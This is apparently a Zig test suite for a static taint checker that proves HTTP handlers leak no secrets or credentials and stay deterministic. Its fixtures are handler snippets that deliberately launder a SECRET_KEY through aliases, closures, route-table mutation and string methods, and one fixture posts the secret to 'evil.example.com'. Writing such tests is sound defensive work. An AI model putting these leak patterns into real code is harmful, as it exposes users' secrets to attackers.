        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  const selected = [found][0];
        \\  selected.handler = () => Response.html("changed");
        \\  return found.handler(req);
        \\}
        ,
        // The table binding is immutable, but a property write changes runtime dispatch.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
        \\const routes = { "GET /probe": clean };
        \\routes["GET /probe"] = leak;
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // Mutation through an alias also invalidates stable dispatch.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
        \\const routes = { "GET /probe": clean };
        \\const alias = routes;
        \\alias["GET /probe"] = leak;
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // The selected result can itself be overwritten before dispatch.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /probe": clean };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  found.handler = () => Response.json({ key: env("SECRET_KEY") });
        \\  return found.handler(req);
        \\}
        ,
        // Reassignment makes a mutable table's dispatch uncertain. Its initial
        // route still contributes its route-only egress root.
        \\import { routerMatch } from "zttp:router";
        \\import { fetch } from "zttp:fetch";
        \\function send(req) {
        \\  fetch(req.url, { body: req.body ?? "" });
        \\  return Response.json({ ok: true });
        \\}
        \\function clean(req) { return Response.json({ ok: true }); }
        \\let routes = { "POST /send": send };
        \\routes = { "POST /send": clean };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // An aggregate can retain a mutable alias to the route table.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
        \\const routes = { "GET /probe": clean };
        \\const box = { table: routes };
        \\box.table["GET /probe"] = leak;
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // Passing the table to an unknown function can mutate its routes.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
        \\function mutate(table) { table["GET /probe"] = leak; }
        \\const routes = { "GET /probe": clean };
        \\mutate(routes);
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // An alias can overwrite the selected handler before dispatch.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /probe": clean };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  const selected = found;
        \\  selected.handler = () => Response.json({ key: env("SECRET_KEY") });
        \\  return found.handler(req);
        \\}
        ,
        // A function binding can change before the table captures it.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
        \\let route = clean;
        \\route = leak;
        \\const routes = { "GET /probe": route };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // A named table inside the handler is outside the contract surface.
        \\import { routerMatch } from "zttp:router";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function handler(req) {
        \\  const routes = { "GET /probe": clean };
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
    };
    for (cases, 0..) |source, case_index| {
        const properties = try runFlowProperties(std.testing.allocator, source);
        inline for (std.meta.tags(FlowProperty)) |property| {
            if (property.holds(properties)) {
                std.debug.print("router uncertainty case {d} still proves {s}\n", .{ case_index, @tagName(property) });
                return error.TestUnexpectedFlowProperty;
            }
        }
    }
}

test "FlowChecker preserves known request string and rawJson calls" {
    const preview =
        \\export function handler(req) {
        \\  if (req.method !== "POST") {
        \\    return Response.json({ error: "method_not_allowed" }, { status: 405 });
        \\  }
        \\  const body = req.body ?? "";
        \\  if (body === "") {
        \\    return Response.json({ error: "body_required" }, { status: 400 });
        \\  }
        \\  const preview = body.slice(0, 8).toUpperCase();
        \\  return Response.json({ preview: preview });
        \\}
    ;
    const preview_properties = try runFlowProperties(std.testing.allocator, preview);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(preview_properties));
    }

    const routed_preview =
        \\import { routerMatch } from "zttp:router";
        \\function preview(req) {
        \\  const body = req.body ?? "";
        \\  const value = body.slice(0, 8).toUpperCase();
        \\  return Response.json({ preview: value });
        \\}
        \\const routes = { "POST /preview": preview };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    const routed_preview_properties = try runFlowProperties(std.testing.allocator, routed_preview);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(routed_preview_properties));
    }

    const inspected_array =
        \\function kindOf(value) { return match (value) { when array: "array" default: "other" }; }
        \\function handler(req) {
        \\  const document = [1, "two", true, null, [3]];
        \\  const kinds = document.map(kindOf);
        \\  return Response.json({ outer: kindOf(document), kinds: kinds });
        \\}
    ;
    const inspected_properties = try runFlowProperties(std.testing.allocator, inspected_array);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(inspected_properties));
    }

    const joined_array =
        \\function handler(req) { return Response.json({ value: ["a", "b"].map((x) => x).join("") }); }
    ;
    const joined_properties = try runFlowProperties(std.testing.allocator, joined_array);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(joined_properties));
    }

    const number_builtin =
        \\function handler(req) {
        \\  return Response.json({
        \\    integer: Number.isInteger(42),
        \\    nan: Number.isNaN(42),
        \\    finite: Number.isFinite(42),
        \\    int: Number.parseInt("42", 10),
        \\    float: Number.parseFloat("4.2"),
        \\  });
        \\}
    ;
    const number_properties = try runFlowProperties(std.testing.allocator, number_builtin);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(number_properties));
    }

    const request_string =
        \\function handler(req) { return Response.json({ part: req.url.slice(0, 2) }); }
    ;
    const request_properties = try runFlowProperties(std.testing.allocator, request_string);
    try std.testing.expect(request_properties.no_secret_leakage);
    try std.testing.expect(request_properties.deterministic);

    const routed_raw_json =
        \\import { routerMatch } from "zttp:router";
        \\function raw(req) { return Response.rawJson("{}"); }
        \\const routes = { "GET /raw": raw };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    const raw_properties = try runFlowProperties(std.testing.allocator, routed_raw_json);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(raw_properties));
    }
}

// ---------------------------------------------------------------------------
// Verified identity reads (M4 T5): `req.subject` and `req.tenant` come from
// the runtime's verifier, so they carry no `user_input`, while `req.body`
// still does. The egress body is the sink that distinguishes the two: it
// clears `input_validated` for unvalidated user input and for nothing else.
// ---------------------------------------------------------------------------

test "FlowChecker gives req.subject and req.tenant no user_input label" {
    const allocator = std.testing.allocator;
    try std.testing.expect(try runInputValidated(allocator,
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  fetch("https://api.example.com/v1", { body: req.subject });
        \\  fetch("https://api.example.com/v1", { body: req.tenant });
        \\  return Response.json({ s: req.subject });
        \\}
    ));
    try std.testing.expect(try runInputValidated(allocator,
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  fetch("https://api.example.com/v1", { body: req["tenant"] });
        \\  return Response.json({ t: req["subject"] });
        \\}
    ));
    // The request body in the same position still carries user_input.
    try std.testing.expect(!try runInputValidated(allocator,
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  fetch("https://api.example.com/v1", { body: req.body });
        \\  return Response.json({ s: req.subject });
        \\}
    ));
}

test "FlowChecker keeps user_input on an identity field the program could write" {
    const allocator = std.testing.allocator;
    const cases = [_][]const u8{
        // A direct write launders the body into the field.
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  req.subject = req.body;
        \\  fetch("https://api.example.com/v1", { body: req.subject });
        \\  return Response.json({ ok: true });
        \\}
        ,
        // Through an alias of the same object.
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const r = req;
        \\  r.tenant = req.body;
        \\  fetch("https://api.example.com/v1", { body: req.tenant });
        \\  return Response.json({ ok: true });
        \\}
        ,
        // Through a computed key the checker cannot read.
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const k = req.body;
        \\  req[k] = req.body;
        \\  fetch("https://api.example.com/v1", { body: req.subject });
        \\  return Response.json({ ok: true });
        \\}
        ,
        // Through a helper that writes its parameter.
        \\import { fetch } from "zttp:fetch";
        \\function stamp(r, v) { r.subject = v; return r; }
        \\function handler(req) {
        \\  stamp(req, req.body);
        \\  fetch("https://api.example.com/v1", { body: req.subject });
        \\  return Response.json({ ok: true });
        \\}
        ,
    };
    for (cases) |source| {
        if (try runInputValidated(allocator, source)) {
            std.debug.print("identity write not caught:\n{s}\n", .{source});
            return error.TestIdentityLaundered;
        }
    }
}

test "FlowChecker keeps a secret assigned onto the request on its identity reads" {
    // Only user_input is discharged; a secret the request picked up stays.
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator,
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  req.extra = env("SECRET_KEY");
        \\  return Response.json({ s: req.subject });
        \\}
    ));
}

test "FlowChecker flags a credential in a hoisted egress options object" {
    // Inline, the `headers` extractor sees the credential. Hoisted into a
    // binding the options object is no longer a literal, so the per-field
    // extractors return empty and only the whole-object fallback runs - and it
    // routes to the egress body sink, which checks secret and user input but
    // never credential.
    const source =
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const token = req.headers.authorization;
        \\  const opts = { headers: { authorization: token } };
        \\  fetch("https://api.example.com/v1", opts);
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(!try runNoCredentialLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret returned by a callback a module invokes" {
    // A module export answers with its declared return labels, and `parallel`
    // declares `external`. Those describe what the module produces and cannot
    // describe what a caller's callback returns, so the secret vanished.
    const source =
        \\import { env } from "zttp:env";
        \\import { parallel } from "zttp:io";
        \\function handler(req) {
        \\  const results = parallel([() => env("SECRET_KEY")]);
        \\  return Response.json({ results: results });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret through a callback passed by name" {
    // Same laundering with the closure bound first. The argument is an
    // identifier, so finding it needs the declaration index rather than the
    // shape of the argument expression.
    const source =
        \\import { env } from "zttp:env";
        \\import { parallel } from "zttp:io";
        \\function handler(req) {
        \\  const cb = () => env("SECRET_KEY");
        \\  const results = parallel([cb]);
        \\  return Response.json({ results: results });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a durable step callback keeps determinism but not secrecy" {
    // The replay boundary neutralizes one label and not the other: the clock
    // read is recorded and replayed, so the response is the same on every run,
    // while a secret the callback returns is still a secret in the response.
    const deterministic_source =
        \\import { step } from "zttp:durable";
        \\function handler(req) { return Response.json({ at: step("ts", () => Date.now()) }); }
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, deterministic_source));

    const secret_source =
        \\import { env } from "zttp:env";
        \\import { step } from "zttp:durable";
        \\function handler(req) {
        \\  return Response.json({ k: step("key", () => env("SECRET_KEY")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, secret_source));
}

test "FlowChecker flags a secret produced by a closure argument" {
    // `inferLabels` had no arm for an arrow or function expression, so a
    // closure passed to a higher-order function contributed nothing and the
    // call's argument union came back empty - the positive claim that the
    // value carries no label. The secret rides out in the mapped array.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const keys = ["a", "b"].map(() => env("SECRET_KEY"));
        \\  return Response.json({ keys: keys });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through a helper chain past the summary depth" {
    // Nested zero-argument helpers put the `env` read past
    // `max_summary_depth`. The fallback used to be the union of the call's
    // arguments, which for a zero-argument call is empty, so the secret
    // arrived at the response carrying no label and the property held. It now
    // carries `.unknown` and the response sink refuses to prove.
    const source =
        \\import { env } from "zttp:env";
        \\function l10() { return env("SECRET_KEY"); }
        \\function l9() { return l10(); }
        \\function l8() { return l9(); }
        \\function l7() { return l8(); }
        \\function l6() { return l7(); }
        \\function l5() { return l6(); }
        \\function l4() { return l5(); }
        \\function l3() { return l4(); }
        \\function l2() { return l3(); }
        \\function l1() { return l2(); }
        \\function handler(req) { return Response.json({ v: l1() }); }
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker refuses to prove through a call it cannot resolve" {
    // `pick` is a parameter, so there is no body to walk. The old fallback
    // returned the argument union - empty here - which reads as the positive
    // claim that the value carries nothing.
    const source =
        \\function handler(req) {
        \\  const pick = req.pick;
        \\  return Response.json({ v: pick() });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker still proves a shallow helper chain" {
    // The conservative fallback must not swallow the ordinary case: a helper
    // the walk can enter, returning a value with no label, still proves.
    const source =
        \\function inner(x) { return x + 1; }
        \\function outer(x) { return inner(x) * 2; }
        \\function handler(req) { return Response.json({ v: outer(1) }); }
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through JSON.stringify in a response" {
    // A method-style call (member callee) must not strip taint labels off its
    // arguments: JSON.stringify(secret) reaching a response body leaks.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text(JSON.stringify({ pw: secret }));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through an array method in a response" {
    // The receiver of a method call carries taint too: [secret].join(",").
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text([secret].join(","));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through a string method in a response" {
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text(secret.slice(0));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through an optional method call in a response" {
    // `[secret]?.join(",")` - direct call through an optional receiver.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text([secret]?.join(","));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through a const-bound arrow wrapper" {
    // A concise arrow `(x) => x` bound to a const is stored with a
    // `.return_stmt` body; the callee summary must collect its return value's
    // labels, not infer them on the return_stmt node (which yields empty and
    // launders the taint).
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const echo = (x) => x;
        \\  return Response.text(echo(secret));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through JSON.stringify into an egress body" {
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  fetch("https://evil.example.com", { method: "POST", body: JSON.stringify({ k: secret }) });
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker proves no_secret_leakage for benign method calls on untainted data" {
    // The conservative member-call union must only fire when a real taint label
    // is present: non-secret data through .join/.map stays clean (no false FP).
    const source =
        \\function handler(req) {
        \\  const items = ["a", "b", "c"];
        \\  return Response.text(items.join(","));
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

const JsxCheckResult = struct { no_secret_leakage: bool, injection_safe: bool };

/// TSX-frontend harness: lower `source` to the core before parsing, run the
/// FlowChecker, and return the two properties the laundering tests assert on.
fn runJsxCheck(allocator: std.mem.Allocator, source: []const u8) !JsxCheckResult {
    var prepared = try source_frontend.PreparedSource.init(allocator, source, "flow-check.tsx", .{});
    defer prepared.deinit();
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, prepared.parserInput());
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return .{
        .no_secret_leakage = checker.getProperties().no_secret_leakage,
        .injection_safe = checker.getProperties().injection_safe,
    };
}

test "FlowChecker flags a secret interpolated through lowered TSX" {
    // Lowering makes `{secret}` an ordinary `h` argument. The conservative
    // call-argument union must retain that taint through renderToString.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.html(renderToString(<p>{secret}</p>));
        \\}
    ;
    const r = try runJsxCheck(std.testing.allocator, source);
    try std.testing.expect(!r.no_secret_leakage);
}

test "FlowChecker keeps injection_safe for request data escaped through renderToString" {
    // renderToString auto-escapes, so user input interpolated into JSX and sent
    // via Response.html is defended -- no XSS warning, injection_safe stays true.
    const source =
        \\function handler(req) {
        \\  return Response.html(renderToString(<p>Method: {req.method}</p>));
        \\}
    ;
    const r = try runJsxCheck(std.testing.allocator, source);
    try std.testing.expect(r.injection_safe);
}

const import_corpus = @import("tests/import_corpus.zig");

test "the import scan populates labels, meta, and the env slot in both atom modes" {
    // Replaces the differential that proved this scan matches the pre-C1
    // implementation. Both atom modes, per C1 finding 2.
    const allocator = std.testing.allocator;

    for ([_]bool{ true, false }) |use_atoms| {
        var parser = try @import("zts-engine").parser.JsParser.init(allocator,
            \\import { env } from "zttp:env";
            \\import { sha256 } from "zttp:crypto";
            \\import { thing } from "zttp-ext:unknown";
        );
        defer parser.deinit();
        var atoms = atom_table.AtomTable.init(allocator);
        defer atoms.deinit();
        if (use_atoms) parser.setAtomTable(&atoms);
        _ = try parser.parse();
        const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

        var checker = FlowChecker.init(allocator, ir_view, if (use_atoms) &atoms else null);
        defer checker.deinit();
        checker.scanImports();

        // Two builtins get meta; the unresolved module gets none.
        std.testing.expectEqual(@as(u32, 2), checker.module_fn_meta.count()) catch |err| {
            std.debug.print("\natoms={}: expected 2 meta entries, found {d}\n", .{ use_atoms, checker.module_fn_meta.count() });
            return err;
        };
        try std.testing.expect(checker.env_fn_slot != null);
        // Only functions with non-empty return labels land in the label map, so
        // this is a strict subset of the meta map rather than the same size.
        try std.testing.expect(checker.module_fn_labels.count() <= checker.module_fn_meta.count());
    }
}

test "the env slot is found through an alias, and unresolved modules are skipped" {
    const allocator = std.testing.allocator;
    var parser = try @import("zts-engine").parser.JsParser.init(allocator,
        \\import { env as e } from "zttp:env";
        \\import { thing } from "zttp-ext:unknown";
    );
    defer parser.deinit();
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    _ = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    checker.scanImports();

    // Matched on the imported name, not the local alias.
    try std.testing.expect(checker.env_fn_slot != null);
    // Builtins only: the unresolved module contributes no meta entry.
    try std.testing.expectEqual(@as(u32, 1), checker.module_fn_meta.count());
}

test "FlowChecker flags a secret carried in an array literal" {
    // Guards the `array_literal` arm of inferLabels: an array must merge its
    // elements' labels the way an object literal merges its members', or a
    // secret launders through one pair of brackets.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const bundle = [secret];
        \\  return Response.json({ leaked: bundle });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "FlowChecker taints the base object through a member-access assignment" {
    // The statement form. `obj.field = secret;` parses as an expr_stmt wrapping
    // the assignment, so the label update in the `.assignment` arm never ran
    // and the mutated object read as clean at the response sink.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const out = {};
        \\  out.k = secret;
        \\  return Response.json(out);
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "FlowChecker taints the base object through a computed-access assignment" {
    // `obj.field = secret` taints `obj`; `obj[key] = secret` walked to a
    // computed_access the root-binding walk had no arm for, so the label was
    // dropped entirely - the exact outcome that walk exists to prevent.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const out = {};
        \\  const key = "k";
        \\  out[key] = secret;
        \\  return Response.json(out);
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "a clock-reading export labels its result nondeterministic" {
    // The label is seeded from the export's own capability set, so it tracks
    // the per-export rows: `jwtVerify` declares `.clock` for its exp check and
    // `parseBearer` declares nothing, and only the first can vary between runs.
    const allocator = std.testing.allocator;
    const source =
        \\import { uuid } from "zttp:id";
        \\function handler(req) {
        \\  const id = uuid();
        \\  return Response.json({ id: id });
        \\}
    ;
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var saw = false;
    var it = checker.module_fn_labels.iterator();
    while (it.next()) |e| {
        if (e.value_ptr.nondeterministic) saw = true;
    }
    try std.testing.expect(saw);
}

test "a capability-free export is not labelled nondeterministic" {
    const allocator = std.testing.allocator;
    const source =
        \\import { parseBearer } from "zttp:auth";
        \\function handler(req) {
        \\  const t = parseBearer(req.headers["authorization"] ?? "");
        \\  return Response.json({ present: t !== undefined });
        \\}
    ;
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var it = checker.module_fn_labels.iterator();
    while (it.next()) |e| {
        try std.testing.expect(!e.value_ptr.nondeterministic);
    }
}

/// Run the flow checker over `source` and report whether it still proves
/// `deterministic`.
fn runDeterministic(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().deterministic;
}

test "a clock-derived value reaching the response costs determinism" {
    // The case the capability heuristic cannot see. `cacheGet` returns a value
    // the store may answer differently on a later run, and the label follows it
    // through the binding into the response body.
    const source =
        \\import { cacheSet, cacheGet } from "zttp:cache";
        \\function handler(req) {
        \\  cacheSet("ns", "k", "v");
        \\  const seen = cacheGet("ns", "k");
        \\  return Response.json({ seen: seen });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a clock read that never reaches the response keeps determinism" {
    // `logInfo` reads the clock for its timestamp and returns nothing that is
    // used, so no label reaches the response sink. This is the false negative
    // the interim capability rule had to special-case; here it falls out of the
    // flow rather than out of a rule about write effects.
    const source =
        \\import { logInfo } from "zttp:log";
        \\function handler(req) {
        \\  logInfo("served", {});
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "a handler touching no varying source keeps determinism" {
    const source =
        \\function handler(req) { return Response.json({ ok: true }); }
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "a row read out of the database costs determinism" {
    // `zttp:sql` declares `.sqlite` and `.policy_check` and no clock, so the
    // capability rule saw nothing varying and this handler proved
    // `deterministic` while the row it returns is whatever the last write left
    // in the table. A read from mutable module state is the second varying
    // source, and it is the one no capability set can express.
    const source =
        \\import { sqlOne } from "zttp:sql";
        \\function handler(req) {
        \\  const row = sqlOne("getUser");
        \\  return Response.json({ row: row });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "cache counters in the response cost determinism" {
    // `cacheStats` reads no clock: it sums counters the store already holds.
    // Before the rows were tightened it was demoted anyway, because
    // `zttp:cache` declared `.clock` at module level for the expiry checks in
    // `cacheGet`. The verdict was right and the reason was an accident, so
    // making the row truthful had to come with the rule that really covers it.
    const source =
        \\import { cacheStats } from "zttp:cache";
        \\function handler(req) {
        \\  return Response.json({ stats: cacheStats() });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a compiled schema is not a varying source" {
    // `zttp:validate` is stateful too, but its state is a schema registry the
    // handler compiles from literals inside its own run, so `validateJson`
    // answers the same way every time. Demoting it would be a false negative on
    // the most common validation path, which is why the rule keys on a `.read`
    // effect rather than on `stateful` alone.
    const source =
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("user", "{}");
        \\  const r = validateJson("user", req.body);
        \\  return Response.json({ ok: r.ok });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

// A parsing export answers with its own declared labels, so for a long time it
// dropped everything its argument carried. Any label laundered through one:
